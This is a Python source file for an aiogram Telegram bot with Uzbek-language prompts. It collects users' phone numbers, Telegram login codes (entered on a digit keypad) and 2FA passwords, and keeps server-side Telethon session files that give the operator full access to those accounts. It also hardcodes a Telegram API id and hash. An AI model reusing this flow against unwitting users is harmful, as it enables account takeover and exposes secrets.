from aiogram import Router, types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
from aiogram import Bot  # Make sure this import is at the top

from keyboards.inline.buttons import generate_code_keyboard, format_code_display
from states.test import LoginState
import os
from telethon_clients import add_save_handler, clients  # Import client registry



api_id = 23781985
api_hash = '02d6562dd390823f0b0cd404ecc1e268'
sessions_dir = "sessions"

router = Router()

@router.message(Command("login"))
async def ask_phone(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    session_path = os.path.join(sessions_dir, f"{user_id}.session")

    client = TelegramClient(session_path, api_id, api_hash)
    await client.connect()
    await state.update_data(session=session_path, client=client)

    if await client.is_user_authorized():
        await message.answer("✅ Siz allaqachon tizimga kirgansiz. Session aktiv.")

        # Only add handler once
        if not hasattr(client, "_save_handler_added"):
            add_save_handler(client)
            client._save_handler_added = True
        return

    markup = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="📱 Raqamni yuborish", request_contact=True)]],
        resize_keyboard=True,
        one_time_keyboard=True
    )
    prompt_msg = await message.answer("📞 Iltimos, telefon raqamingizni yuboring:", reply_markup=markup)
    await state.update_data(prompt_msg_id=prompt_msg.message_id)
    await state.set_state(LoginState.waiting_number)


@router.message(F.contact, LoginState.waiting_number)
async def handle_contact(message: types.Message, state: FSMContext,bot: Bot):
    phone_number = message.contact.phone_number
    data = await state.get_data()
    client = data.get("client")
    prompt_msg_id = data.get("prompt_msg_id")
    # print(phone_number)
    try:

        sent = await client.send_code_request(phone_number)
        # print(sent)
        await state.update_data(
            phone=phone_number,
            current_code=""
        )

        # Step 1: Remove user contact message
        await message.delete()
        await bot.delete_message(chat_id=message.chat.id, message_id=prompt_msg_id)

        text = (
                "🔐 <b>Tizimga kirish</b>\n\n"
                "✅ Telefon raqami qabul qilindi\n"
                "📲 Telegramdan kelgan 5 xonali kodni kiriting:\n\n"
            "👇 <b>Kod: _ _ _ _ _</b>"
        )
        await message.answer(
            text,
            reply_markup=generate_code_keyboard(""),
            parse_mode="HTML"
        )

        await state.set_state(LoginState.code_input)
    except Exception as e:
        await message.answer(f"❌ Kod yuborilmadi. Telefon raqamingiz noto‘g‘ri bo‘lishi mumkin.{e}")
        await client.disconnect()

@router.callback_query(LoginState.code_input)
async def handle_code_input(call: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    phone = data.get("phone")
    client = data.get("client")
    current_code = data.get("current_code", "")
    action = call.data

    if action.startswith("digit:"):
        code = action.split(":")[1]

        if len(current_code) < 5:
            await state.update_data(current_code=code)
            text = (
                "🔐 <b>Tizimga kirish</b>\n\n"
                "✅ Telefon raqami qabul qilindi\n"
                "📲 Telegramdan kelgan 5 xonali kodni kiriting:\n\n"
                f"👇 <b>Kod:</b> {format_code_display(code)}"
            )
            await call.message.edit_text(text, reply_markup=generate_code_keyboard(code), parse_mode="HTML")
        else:
            await call.message.answer("5tadan ortiq son qabul qilinmaydi")

    elif action == "clear":
        await state.update_data(current_code="")
        text = (
            "🔐 <b>Tizimga kirish</b>\n\n"
            "✅ Telefon raqami qabul qilindi\n"
            "📲 Telegramdan kelgan 5 xonali kodni kiriting:\n\n"
            "👇 <b>Kod: _ _ _ _ _</b> "
        )
        current_code=''
        code=''
        await call.message.edit_text(text, reply_markup=generate_code_keyboard(""), parse_mode="HTML")

    elif action.startswith("submit:"):
        code = action.split(":")[1]
        try:
            await client.sign_in(phone=phone, code=code)
            await call.message.edit_text("✅ Muvaffaqiyatli login qilindi.", reply_markup=None)
            # Only add handler once
            if not hasattr(client, "_save_handler_added"):
                add_save_handler(client)
                client._save_handler_added = True

            await state.clear()
        except SessionPasswordNeededError:
            await state.update_data(code=code)
            await call.message.edit_text("🔐 2FA parolni yuboring:", reply_markup=None)
            await state.set_state(LoginState.two_factor_password)
        except Exception as e:
            await call.message.edit_text(f"❌ Xatolik:\n{e}", reply_markup=None)

@router.message(LoginState.two_factor_password)
async def handle_password(message: types.Message, state: FSMContext):
    password = message.text.strip()
    data = await state.get_data()
    client = data.get("client")
    try:
        await client.sign_in(password=password)
        await message.delete()
        await message.answer("🔓 2FA muvaffaqiyatli.\n ✅ Login qilindi.")
        # Only add handler once
        if not hasattr(client, "_save_handler_added"):
            add_save_handler(client)
            client._save_handler_added = True

        await state.clear()
    except Exception as e:
        await message.answer(f"❌ Noto‘g‘ri 2FA parol !\nQaytadan 🔐 2FA parolni yuboring ")
        await state.set_state(LoginState.two_factor_password)

@router.message(Command('logout'))
async def logout_user(message: types.Message, state: FSMContext):
    data = await state.get_data()
    client = data.get("client")
    user_id = message.from_user.id

    try:
        if client and client.is_connected():
            clients.pop(user_id, None)  # Remove from active registry
            await client.disconnect()

        await message.answer("🚪 Tizimdan chiqdingiz. ✅\nQayta kirish uchun: /login", reply_markup=ReplyKeyboardRemove())
    except Exception as e:
        await message.answer(f"❌ Logoutda xatolik yuz berdi:\n{e}")
    finally:
        await state.clear()
